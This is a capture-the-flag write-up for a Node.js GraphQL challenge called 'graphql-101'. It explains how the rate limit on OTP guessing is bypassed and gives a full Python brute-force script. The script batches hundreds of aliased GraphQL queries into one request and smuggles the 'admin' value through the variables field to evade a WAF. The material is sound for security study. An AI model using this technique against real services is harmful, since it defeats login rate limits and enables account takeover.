# graphql-101

![Untitled](graphql-101%20f869ac78740e4f989e93e47da8080c8a/Untitled.png)

| framework | nodejs & graphql |
| --- | --- |
| vulnerability | ratelimit bypass via query variable & alias |

# Description

```jsx
var otps = Object.create(null);
otps["admin"] = Object.create(null);
function genOtp(ip, force = false) {
  if (force || !otps["admin"][ip]) {
    function intToString(v) {
      let s = v.toString();
      while (s.length !== STRENGTH_CHALLENGE.toString().length) s = '0' + s;
      return s;
    }
    const otp = [];
    for (let i = 0; i < NUM_CHALLENGE; ++i) 
      otp.push(
        intToString(crypto.randomInt(0, STRENGTH_CHALLENGE))
      );
    otps["admin"][ip] = otp;
  }
}
```

In order to get the flag, we must guess 40 otps.

```jsx
const rateLimiter = require('express-rate-limit')({
  windowMs: 30 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  onLimitReached: async (req) => genOtp(req.ip, true)
})
```

The thing makes this challenge tricky was rate limit. Since we can request only 5 for the 30 minues, it was not possible just brute force the otp.(*if not corrected)

```jsx
// Construct a schema, using GraphQL schema language
const schema = buildSchema(`
  type Query {
    otp(u: String!, i: Int!, otp: String!): String!
  }
`);
```

we use above schema in order to query the otp check.

```jsx
app.use(require('body-parser').json({ limit: '128b' }));
```

Since there is body length limitation, we can’t query more than 1.

```jsx
function isDangerousValue(s) {
  return s.includes('admin') || s.includes('\\'); // Linux does not need to support "\"
}
```

And there was WAF which checks “admin” exists in req.url.

## payload

```jsx
import requests

# url = "http://localhost:7654"
url = "http://34.84.220.22:7654"

query_prefix = 'query($u:String!){'
query_suffix = '}'
for i in range(0, 40):    
    print("TRYING", i)
    for k in range(0, 4):
        query = ''
        for j in range(250 * k, 250 * k + 250):
            if j > 999:
                break
            otp = str(j).zfill(3)
            query += f'a{j}:otp(u:$u,i:{i},otp:"{otp}"),'
        query = query_prefix + query[:-1] + query_suffix
        r = requests.post(f'{url}/graphql', params={'query':query}, proxies={'http': 'http://localhost:8080'}, json={"variables": {"u": "admin"}}).text
        if 'OK !!!' in r:
            print("[+] Found OTP", i)
            break

r = requests.get(f'{url}/ADMIN', proxies={'http': 'http://localhost:8080'})
print(r.text)
```

It's also possible to pass query parameters via the `url query parmeter`. Additionally, there is a `variables field` that enables the use of variables; the server can interpret these variables declared in the body, which are utilized by the URL query parameters.